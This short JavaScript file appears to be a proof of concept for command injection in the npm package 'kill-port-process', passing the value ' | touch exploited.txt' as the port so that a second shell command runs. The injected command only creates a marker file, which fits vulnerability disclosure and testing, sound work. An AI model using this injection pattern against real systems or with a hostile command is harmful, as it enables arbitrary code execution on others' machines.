const pkg = require('kill-port-process');

const payload = " | touch exploited.txt";

console.log(pkg);

const input = payload;

pkg(input);